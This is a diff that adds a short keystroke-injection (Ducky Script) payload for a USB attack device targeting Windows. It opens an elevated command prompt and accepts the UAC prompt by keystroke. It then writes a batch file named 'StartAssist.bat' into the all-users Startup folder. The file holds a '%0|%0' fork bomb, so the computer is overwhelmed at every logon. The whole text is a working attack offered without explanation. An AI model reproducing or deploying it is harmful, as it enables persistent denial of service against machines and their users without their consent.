@@ -1,0 +1,23 @@
+DELAY 1000
+GUI d
+DELAY 300
+CTRL ESC
+DELAY 500
+STRING cmd
+DELAY 100
+CTRL SHIFT ENTER
+DELAY 400
+LEFT
+DELAY 50
+ENTER
+DELAY 300
+STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+ENTER
+STRING copy con StartAssist.bat
+ENTER
+STRING @echo off
+ENTER
+STRING %0|%0
+ENTER
+DELAY 100
+ALT F4
